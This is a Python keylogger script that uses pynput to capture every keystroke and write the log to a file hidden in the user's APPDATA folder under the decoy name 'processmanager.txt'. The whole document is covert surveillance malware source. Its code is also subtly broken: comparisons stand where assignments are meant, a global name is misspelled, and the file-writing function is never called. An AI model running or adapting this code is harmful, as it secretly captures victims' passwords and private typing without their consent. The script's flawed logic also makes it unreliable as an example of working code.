#!/usr/bin/python

import pynput.keyboard
import threading
import os
log = ""
path = os.environ["appdata"] + "\\processmanager.txt"
def process_keys(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log +""
        elif key == key.right:
            log = log + ""
        elif key ==  key.left:
            log = log + ""
        elif key == key.up:
            log == log + ""
        elif key == key.down:
            log == log + ""
        else:
            log = log + " " + str(key) + " "


    print(log)
    #with open("log.txt","a") as fin:
     #   fin.write(str(key))
def report():
    global lbg
    global path
    fin = open(path, "a")
    fin.write(log)
keyboard_listener = pynput.keyboard.Listener(on_press=process_keys)
with keyboard_listener:
    keyboard_listener.join()
        